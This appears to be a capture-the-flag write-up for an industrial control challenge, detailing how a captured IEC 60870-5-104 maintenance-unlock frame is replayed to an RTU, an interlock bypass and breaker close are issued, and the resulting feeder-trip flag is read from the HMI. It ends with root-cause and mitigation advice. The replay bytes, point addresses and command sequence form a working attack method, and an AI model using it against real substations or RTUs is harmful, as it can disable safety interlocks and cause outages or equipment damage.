---
title: Crownspire Transfer
summary: Use an IEC 60870-5-104 RTU and a captured maintenance session to force an interlocked power transfer and collect the feeder-trip checkpoint token.
date: 2026-07-31
tags: [Hack The Box, Cyber Apocalypse 2026, ICS]
difficulty: medium
os: N/A
---

# Crownspire Transfer (Medium) - OT/ICS Writeup

## Challenge
Stormbound crews found a Frostline feeder RTU still guarding the Crownspire east transfer bus. The live HMI shows a loaded transfer pump and a transfer breaker held open by an interlock. Recover enough control to force the unsafe transfer and collect the checkpoint token from the resulting feeder-trip alarm.

**Targets:**
- `154.57.164.73:30307`, IEC 60870-5-104 RTU (the asset)
- `154.57.164.73:30958`, HMI web interface

**Provided:** `backup.pcap`, a capture of a legitimate maintenance session against the RTU.

## HMI Recon

The HMI (`Frostline RLY-104 Feeder Guard`) shows the process picture:

- **52-M** (main breaker): closed
- **52-T** (tie/transfer breaker): open, held by a **phase-angle interlock**
- **P-43 Transfer Pump**: running (loaded)
- Alarm table: `RLY104-INHIBIT`, *"52-T transfer close inhibited by phase-angle interlock"*
- CA (common address) shown in the corner: `17`, protocol `IEC 60870-5-104`

The goal is implied directly by the picture: the pump is running and 52-T is blocked from closing by the interlock. Forcing 52-T closed while the pump is loaded and out of phase should trip the feeder, which is where the flag lives.

## PCAP Analysis

The pcap contains an internal IEC-104 session (172.17.0.1 to 172.17.0.5, port 2404) showing a full maintenance and control sequence. Decoding the ASDUs frame by frame:

| # | Direction | Type | COT | CA | IOA | Meaning |
|---|-----------|------|-----|-----|-----|---------|
| 7 | client to RTU | 104 (custom) | 6 (act) | 17 | 266500 | Maintenance unlock, 8-byte key payload `bb 32 24 56 bd a8 7c ee` |
| 21 | client to RTU | 100 (C_IC_NA_1) | 6 | 65535 | 0 | General interrogation |
| 26 | client to RTU | 103 (C_CS_NA_1) | 6 | 65535 | 0 | Clock sync |
| 29 | client to RTU | 45 (C_SC_NA_1) | 6 | 17 | 1101 | SELECT ON (SCO=0x81) |
| 32 | client to RTU | 45 | 6 | 17 | 1101 | EXECUTE ON (SCO=0x01) |
| 34 | RTU to client | 45 | 10 (actterm) | 17 | 1101 | Activation confirmed complete |
| 36 | client to RTU | 45 | 6 | 17 | 1201 | SELECT ON |
| 38 | client to RTU | 45 | 6 | 17 | 1201 | EXECUTE ON |

This is a textbook select-before-operate IEC-104 sequence:

1. Send a vendor-specific Type 104 "maintenance unlock" frame to IOA `266500` on CA `17`, carrying a fixed key blob captured from the legitimate session. This is a replay of a stale maintenance credential; the RTU doesn't appear to validate freshness or challenge-response on this custom frame.
2. SELECT then EXECUTE IOA `1101`, the interlock bypass.
3. SELECT then EXECUTE IOA `1201`, the 52-T tie breaker close command.

Because the legitimate session's unlock frame is static (no nonce or timestamp binding observed), it can be replayed byte-for-byte against the live target.

## Exploitation

Reused a Python IEC-104 client (STARTDT handshake, I-frame sequence number tracking, ASDU builder) to replay the captured sequence against the real target on `154.57.164.73:30307`:

```python
HOST = "154.57.164.73"
PORT = 30307
CA = 17
UNLOCK_IOA = 266500
UNLOCK_DATA = bytes.fromhex("bb 32 24 56 bd a8 7c ee")
```

**Phase 1, maintenance unlock:**
```
STARTDT confirmed
send Type 104 ASDU: type=104 qty=1 cot=6 ca=17 ioa=266500 data=bb 32 24 56 bd a8 7c ee
```

**Phase 2, control:**
```
SELECT/EXECUTE IOA 1101 (interlock bypass), ActTerm (cause=10) confirms it took effect
SELECT/EXECUTE IOA 1201 (52-T breaker close), accepted, no NEGATIVE flag
```

Both commands were accepted cleanly by the RTU (no negative confirmation bit set), meaning the interlock bypass and breaker close both landed.

## Flag Recovery

The IEC-104 socket itself just streamed routine measured-value telemetry (IOA 2101, feeder load, matching the HMI's "Feeder Load" tag) after the control sequence. No flag on the wire. The result surfaced on the HMI's status and alarm endpoints instead:

```bash
curl http://154.57.164.73:30958/status.json
```
```json
{
  "last_handoff": "stale maintenance proof accepted",
  "last_command": "52-T close caused phase-slip trip",
  "process": {
    "interlock_bypass": true,
    "tie_breaker_closed": false,
    "feeder_trip": true,
    ...
  },
  "events": [
    "TRANSFER INHIBIT: breaker 52-T held open by phase-angle interlock.",
    "AUTH: stale maintenance proof accepted.",
    "CONTROL: interlock bypass set to 1.",
    "CONTROL: 52-T tie breaker set to 1.",
    "TRIP: 52-T closed out of phase while transfer pump was loaded."
  ]
}
```

```bash
curl http://154.57.164.73:30958/alarms
```
```json
{
  "alarms": [
    {
      "id": "RLY104-PHASE-SLIP",
      "severity": "CRIT",
      "message": "52-T phase-slip trip asserted - TOKEN ||HTB{104_stale_handoff_tripped_52t_*********************************||"
    }
  ]
}
```

## Flag

```
||HTB{104_stale_handoff_tripped_52t_*********************************||
```

## Root Cause / Fix

- Replayable maintenance auth: the Type 104 "maintenance unlock" frame is a static shared secret with no challenge-response, timestamp, or single-use nonce. Anyone who captures one legitimate maintenance session can replay it indefinitely ("stale maintenance proof accepted," per the RTU's own event log).
- No physical or logical re-validation of the interlock's purpose: the phase-angle interlock exists specifically to prevent 52-T from closing while out of sync with a loaded transfer pump. Once the interlock bit itself is writable via a network command, the safety function is only as strong as access control on that single point (IOA 1101). It should not be remotely writable at all, or should require hardware-level, not protocol-level, confirmation.
- Fix: bind maintenance credentials to time/session (HMAC challenge-response or short-lived tokens), and move safety interlocks out of remotely-writable point space entirely. Enforce them in hardwired logic or a separate protection relay that isn't reachable over the same IEC-104 channel as operational control points.
